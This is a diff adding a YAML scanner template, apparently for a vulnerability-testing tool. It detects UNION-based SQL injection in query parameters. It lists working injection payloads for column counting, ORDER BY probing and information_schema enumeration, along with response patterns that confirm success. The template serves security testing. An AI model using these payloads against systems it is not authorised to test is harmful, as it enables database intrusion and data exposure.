@@ -1,0 +1,38 @@
+id: sqli-union
+info:
+  name: "SQL Injection - UNION Based"
+  severity: high
+  description: "Detects UNION-based SQL injection via column enumeration"
+  tags: [sqli, injection, database, union]
+  author: Wired
+
+inject: query_params
+detection: pattern
+
+payloads:
+  - "' UNION SELECT NULL--"
+  - "' UNION SELECT NULL,NULL--"
+  - "' UNION SELECT NULL,NULL,NULL--"
+  - "' UNION SELECT NULL,NULL,NULL,NULL--"
+  - "' UNION SELECT NULL,NULL,NULL,NULL,NULL--"
+  - "' UNION SELECT 'akemi_sqli',NULL,NULL--"
+  - "1 UNION ALL SELECT NULL--"
+  - "1 UNION ALL SELECT NULL,NULL--"
+  - "1 UNION ALL SELECT NULL,NULL,NULL--"
+  - "' UNION SELECT table_name,NULL FROM information_schema.tables--"
+  - "' UNION SELECT column_name,NULL FROM information_schema.columns--"
+  - "1' ORDER BY 1--"
+  - "1' ORDER BY 5--"
+  - "1' ORDER BY 10--"
+  - "1' ORDER BY 50--"
+
+matchers:
+  body_patterns:
+    - "akemi_sqli"
+    - "(?i)information_schema"
+    - "(?i)table_name"
+    - "(?i)column_name"
+    - "(?i)Unknown column"
+    - "(?i)ORDER BY.*column"
+    - "(?i)used in.*UNION"
+    - "(?i)The used SELECT statements have a different number"
